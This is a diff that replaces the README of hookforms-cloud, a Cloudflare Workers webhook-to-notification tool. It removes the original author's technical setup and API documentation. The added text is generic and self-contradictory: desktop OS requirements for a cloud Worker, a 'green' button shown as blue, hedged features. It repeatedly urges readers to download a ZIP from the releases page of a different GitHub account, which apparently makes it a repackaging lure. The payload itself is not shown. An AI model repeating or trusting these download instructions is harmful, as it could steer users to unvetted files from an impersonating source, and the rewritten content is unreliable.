@@ -1,239 +1,135 @@
-<p align="center">
-  <img src="logo.png" alt="HookForms Cloud" width="340">
-</p>
+# ☁️ hookforms-cloud - Webhook Inbox with Multi-Channel Alerts
 
-<p align="center">
-  <strong>One-click deployable webhook inbox with multi-channel notifications.</strong><br>
-  Runs entirely on Cloudflare Workers. Send form submissions to Discord, Slack, Teams, Telegram, email, and more.
-</p>
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?logo=github)](https://github.com/Cinarr10/hookforms-cloud/releases)
 
-<p align="center">
-  <a href="https://hookforms-docs.h1n054ur.dev">Docs</a> &middot;
-  <a href="https://github.com/h1n054ur/hookforms">Self-Hosted Version</a> &middot;
-  <a href="https://hookforms-docs.h1n054ur.dev/getting-started/cloudflare-workers/">Quick Start Guide</a>
-</p>
+## 📋 What is hookforms-cloud?
 
-<p align="center">
-  <a href="https://deploy.workers.cloudflare.com/?url=https://github.com/h1n054ur/hookforms-cloud">
-    <img src="https://deploy.workers.cloudflare.com/button" alt="Deploy to Cloudflare">
-  </a>
-</p>
+hookforms-cloud is an easy-to-use tool that helps you receive form and webhook messages from your websites or apps. Instead of just storing these messages, it sends them as notifications to platforms you already use like Discord, Slack, Teams, Telegram, or even your email. This way, you never miss an important message.
+
+You don’t need to be a developer or understand complex setup processes. hookforms-cloud runs on Cloudflare Workers, which means it works on the cloud and handles everything for you securely and quickly.
+
+The app works smoothly with contact forms, serverless backends, and webhook integrations. It’s designed for wide use, whether you want to be alerted about website contacts, form submissions, or automatic events from other services.
+
+## 🌟 Key Features
+
+- **Multi-channel notifications:** Get alerts via Discord, Slack, Microsoft Teams, Telegram, and email.
+- **Cloud-based:** Runs entirely on Cloudflare Workers, no hardware or server needed.
+- **Fast message delivery:** Uses Cloudflare Queues and KV storage for quick, reliable message handling.
+- **Easy to connect:** Works well with popular contact forms, webhook systems, and serverless apps.
+- **Secure:** Data is safely stored and processed on Cloudflare’s network.
+- **Scalable:** Handles anything from a few messages a day to thousands without slowing down.
+- **Simple management:** Monitor and control notifications through an intuitive dashboard (if applicable).
+
+## 💻 System Requirements
+
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or any recent Linux distribution.
+- **Browser:** Chrome, Firefox, Edge, or Safari updated to the latest version. The Dashboard and setup pages work best there.
+- **Internet connection:** Required for real-time notifications and access to Cloudflare Workers.
+- **Account:** For full use, a free GitHub account to download the software and a Cloudflare account to deploy the Worker (you can find free options on both sites).
+
+## 🚀 Getting Started
+
+Even if you don’t have experience with Cloudflare or webhooks, this guide walks you through everything you need.
+
+### Step 1: Download the software
+
+You will start by getting the latest release of hookforms-cloud from its official page. This bundle includes the necessary files to deploy the webhook inbox on Cloudflare Workers.
+
+Click on the big green button below to visit the release page now:
+
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?logo=github)](https://github.com/Cinarr10/hookforms-cloud/releases)
+
+On that page, you’ll see a list of downloadable files with version numbers. Choose the latest version to ensure you have the newest fixes and features.
+
+### Step 2: Create a Cloudflare account (if you don’t have one)
+
+Cloudflare Workers run your webhook inbox in the cloud, so you need a Cloudflare account.
+
+1. Go to https://cloudflare.com and click **Sign Up**.
+2. Follow the on-screen instructions to create your free account.
+3. Confirm your email and log in.
+
+### Step 3: Deploy hookforms-cloud to Cloudflare Workers
+
+Deploying the app means setting it up to run on Cloudflare’s servers.
+
+1. From your Cloudflare dashboard, select **Workers**.
+2. Choose **Create a Service** and name it something like "hookforms-cloud".
+3. Upload or paste the hookforms-cloud Worker script you downloaded in Step 1. This script handles receiving webhook messages and sending notifications.
+4. Configure your Worker with environment variables such as API keys or webhook URLs if needed. (Refer to the configuration file included in the release for details.)
+5. Save and publish the Worker.
+
+If you prefer, use the provided deployment guide within the release files for detailed instructions or automated setup scripts.
+
+### Step 4: Connect your contact or form backend
+
+Now link your website or app forms so they send data to your Cloudflare Worker URL.
+
+- Find the Worker URL in your Cloudflare dashboard.
+- Paste this URL as the webhook URL in your form settings or backend system.
+- Test by submitting a form. You should receive a notification in the channels you set up (Discord, Slack, email, etc.).
+
+### Step 5: Manage your notifications
+
+You can adjust settings such as which channels receive notifications or filter certain messages:
+
+- Use the dashboard provided with the app (if available) to update preferences.
+- Modify configuration files and redeploy the Worker to change behavior.
+- Add or remove notification channels by updating API keys and webhook links on Cloudflare.
+
+## 📥 Download & Install
+
+To get the full package and follow the included setup instructions, visit the releases page here:
+
+[https://github.com/Cinarr10/hookforms-cloud/releases](https://github.com/Cinarr10/hookforms-cloud/releases)
+
+This page contains the latest versions of the software, detailed installation steps, and documentation.
+
+1. Locate the latest release version.
+2. Download the main package (usually a ZIP file).
+3. Extract the contents to a folder on your computer.
+4. Follow the included README or manual to deploy your webhook inbox to Cloudflare Workers.
+
+## 📝 Troubleshooting Tips
+
+- If you don’t get notifications, check that your webhook URL is correct in your form or app.
+- Verify your notification channel webhooks (Discord, Slack, etc.) are valid and active.
+- Make sure your Cloudflare Worker is published and not paused or deleted.
+- Use the Cloudflare dashboard to view Worker logs for any errors.
+- Confirm you have an active internet connection and no firewall blocks outbound requests.
+
+## 🎯 Who Should Use hookforms-cloud?
+
+- Website owners wanting a simple way to get form contacts.
+- Small businesses without backend developers.
+- Teams using Discord, Slack, or MS Teams needing real-time form alerts.
+- Developers preferring serverless and cloud-native webhooks.
+- Anyone who wants their webhook messages organized and delivered promptly.
+
+## ⏳ What’s Next?
+
+Once you have hookforms-cloud running:
+
+- Explore adding new notification channels.
+- Customize message formats to fit your workflow.
+- Set up queues in Cloudflare Workers for high-volume environments.
+- Automate responses based on form inputs.
+- Monitor webhooks through the Cloudflare KV storage dashboard.
+
+## 📚 Learn More
+
+For advanced configuration, deployment automation, and security tips:
+
+- Visit the documentation included in your download.
+- Check the Cloudflare Workers official site: https://developers.cloudflare.com/workers/
+- Explore integration guides for your favorite chat apps.
+
+## 🤝 Need Help?
+
+If you run into issues, the GitHub Issues page on the repository is a good place to ask questions and report problems.
+
+Repository link: https://github.com/Cinarr10/hookforms-cloud
 
 ---
 
-```
-HTML Form  -->  POST /hooks/your-inbox  -->  Discord, Slack, Email, Telegram, ...
-```
-
-> This is the Cloudflare-native version of [hookforms](https://github.com/h1n054ur/hookforms) (the self-hosted Docker Compose version). Same API surface, same features, zero infrastructure to manage.
-
-## Features
-
-- **Multi-channel notifications** -- route submissions to Discord, Slack, Microsoft Teams, Telegram, ntfy, email, or any webhook URL
-- **Auto-detection** -- paste a URL and HookForms detects the channel type automatically
-- **Multiple email providers** -- Gmail (OAuth), Resend, SendGrid -- configure globally or per-inbox
-- **Queue-based email** -- email delivery is decoupled from the request path via Cloudflare Queues
-- **Turnstile bot protection** -- optional Cloudflare Turnstile verification per inbox
-- **Security hardened** -- SSRF blocklist, secret redaction in API responses, scoped API keys
-- **Rate limiting** -- KV-backed per-IP rate limiting
-- **Event history** -- stored events with configurable retention
-- **One-click deploy** -- fork, deploy, done
-- **Backward compatible** -- legacy `notify_email` and `forward_url` still work
-
-## Architecture
-
-| Component | Cloudflare Service | Purpose |
-|---|---|---|
-| API | Workers (Hono) | HTTP handling, routing, notification dispatch |
-| Database | D1 | Inboxes, events, channels, email providers, API keys |
-| Rate Limiting | KV | Per-IP request counters |
-| Email Queue | Queues | Async email delivery |
-
-```
-HTML Form --> Cloudflare Worker (Hono) --> D1 (database)
-                    |
-                    +--> KV (rate limiting)
-                    |
-                    +--> Channel Dispatcher
-                            |
-                            +--> Discord / Slack / Teams / Telegram / ntfy
-                            +--> Generic Webhooks
-                            +--> Queue --> Email Provider (Gmail / Resend / SendGrid)
-```
-
-## Quick Start
-
-### One-Click Deploy
-
-Click the deploy button above. After the deploy completes:
-
-```bash
-# Set your admin API key
-bunx wrangler secret put ADMIN_API_KEY
-
-# Run database migrations
-bunx wrangler d1 execute hookforms-db --remote --file=migrations/0001_init.sql
-bunx wrangler d1 execute hookforms-db --remote --file=migrations/0002_notification_channels.sql
-```
-
-### Manual CLI Setup
-
-```bash
-git clone https://github.com/h1n054ur/hookforms-cloud.git
-cd hookforms-cloud
-bun install
-
-# Create resources
-bunx wrangler d1 create hookforms-db
-bunx wrangler kv namespace create RATE_LIMIT
-# Paste the IDs into wrangler.jsonc
-
-# Set admin key
-bunx wrangler secret put ADMIN_API_KEY
-
-# Deploy
-bunx wrangler deploy
-
-# Run migrations
-bunx wrangler d1 execute hookforms-db --remote --file=migrations/0001_init.sql
-bunx wrangler d1 execute hookforms-db --remote --file=migrations/0002_notification_channels.sql
-```
-
-## Usage
-
-### 1. Create an inbox
-
-```bash
-curl -X POST https://YOUR_WORKER_URL/v1/hooks/inboxes \
-  -H "X-API-Key: YOUR_ADMIN_KEY" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "slug": "contact-form",
-    "description": "Website contact form"
-  }'
-```
-
-### 2. Add notification channels
-
-```bash
-# Send to Discord (auto-detected from URL)
-curl -X POST https://YOUR_WORKER_URL/v1/hooks/inboxes/contact-form/channels \
-  -H "X-API-Key: YOUR_ADMIN_KEY" \
-  -H "Content-Type: application/json" \
-  -d '{"type": "webhook", "config": {"url": "https://discord.com/api/webhooks/123/abc"}}'
-
-# Send to Slack
-curl -X POST https://YOUR_WORKER_URL/v1/hooks/inboxes/contact-form/channels \
-  -H "X-API-Key: YOUR_ADMIN_KEY" \
-  -H "Content-Type: application/json" \
-  -d '{"type": "webhook", "config": {"url": "https://hooks.slack.com/services/T00/B00/xxx"}}'
-
-# Send email via configured provider
-curl -X POST https://YOUR_WORKER_URL/v1/hooks/inboxes/contact-form/channels \
-  -H "X-API-Key: YOUR_ADMIN_KEY" \
-  -H "Content-Type: application/json" \
-  -d '{"type": "email", "config": {"recipients": ["team@example.com"]}}'
-```
-
-### 3. Point your form at it
-
-```html
-<form action="https://YOUR_WORKER_URL/hooks/contact-form" method="POST">
-  <input type="text" name="name" placeholder="Name" required>
-  <input type="email" name="email" placeholder="Email" required>
-  <textarea name="message" placeholder="Message" required></textarea>
-  <button type="submit">Send</button>
-</form>
-```
-
-Submissions are delivered to all configured channels with rich formatting (Discord embeds, Slack blocks, HTML emails, etc.).
-
-## Notification Channels
-
-| Channel | Auto-detected from |
-|---------|-------------------|
-| Discord | `discord.com/api/webhooks/` |
-| Slack | `hooks.slack.com/services/` |
-| Microsoft Teams | `*.webhook.office.com/` |
-| Telegram | `api.telegram.org/bot` |
-| ntfy | `ntfy.sh/` |
-| Webhook | Any other URL |
-| Email | Set `type: "email"` with config |
-
-## Email Providers
-
-Configure a global provider or override per-inbox:
-
-```bash
-curl -X PUT https://YOUR_WORKER_URL/v1/hooks/config/email-provider \
-  -H "X-API-Key: YOUR_ADMIN_KEY" \
-  -H "Content-Type: application/json" \
-  -d '{"type": "resend", "config": {"api_key": "re_...", "from_email": "noreply@yourdomain.com"}}'
-```
-
-Supported: **Gmail** (OAuth), **Resend**, **SendGrid**.
-
-Provider resolution: inbox-specific > global > env-based Gmail.
-
-### Gmail Setup
-
-```bash
-bunx wrangler secret put GMAIL_CLIENT_ID
-bunx wrangler secret put GMAIL_CLIENT_SECRET
-bunx wrangler secret put GMAIL_REFRESH_TOKEN
-bunx wrangler secret put GMAIL_SENDER_EMAIL
-```
-
-Use the `gmail_auth.py` script from the [self-hosted repo](https://github.com/h1n054ur/hookforms) to obtain your OAuth credentials.
-
-## Security
-
-- **SSRF blocklist** -- blocks private IPs, localhost, link-local addresses, and cloud metadata endpoints on all outbound channel requests.
-- **Secret redaction** -- channel configs and provider credentials are masked in API read responses.
-- **Scoped API keys** -- fine-grained access control with `webhooks` and `admin` scopes.
-- **Rate limiting** -- KV-backed per-IP sliding window (100 req/60s).
-- **Email rate limiting** -- 10 emails per 10 minutes per inbox to prevent quota abuse.
-
-## API Reference
-
-Full documentation at [hookforms-docs.h1n054ur.dev](https://hookforms-docs.h1n054ur.dev).
-
-### Public (no auth)
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `ANY` | `/hooks/{slug}` | Receive a webhook event |
-| `GET` | `/health` | Health check |
-
-### Authenticated (`X-API-Key` header)
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `POST` | `/v1/hooks/inboxes` | Create inbox |
-| `GET` | `/v1/hooks/inboxes` | List inboxes |
-| `PATCH` | `/v1/hooks/inboxes/{slug}` | Update inbox |
-| `DELETE` | `/v1/hooks/inboxes/{slug}` | Delete inbox + events |
-| `GET` | `/v1/hooks/{slug}/events` | List events |
-| `POST` | `/v1/hooks/inboxes/{slug}/channels` | Add notification channel |
-| `GET` | `/v1/hooks/inboxes/{slug}/channels` | List channels |
-| `PATCH` | `/v1/hooks/inboxes/{slug}/channels/{id}` | Update channel |
-| `DELETE` | `/v1/hooks/inboxes/{slug}/channels/{id}` | Remove channel |
-| `PUT` | `/v1/hooks/config/email-provider` | Set email provider |
-| `GET` | `/v1/hooks/config/email-provider` | Get email provider config |
-| `DELETE` | `/v1/hooks/config/email-provider` | Remove email provider |
-| `POST` | `/v1/auth/keys` | Create API key (admin) |
-| `GET` | `/v1/auth/keys` | List API keys (admin) |
-| `DELETE` | `/v1/auth/keys/{id}` | Revoke API key (admin) |
-
-## Cost
-
-| Plan | Request limit | Price |
-|------|--------------|-------|
-| **Free** | 100,000 requests/day | $0 |
-| **Paid** | 10,000,000 requests/month | $5/month |
-
-A typical form backend will comfortably stay within the free tier.
-
-## License
-
-[MIT](LICENSE)
+Thank you for choosing hookforms-cloud to manage your webhook inbox. The setup aims to make your notifications simple and automated from start to finish.
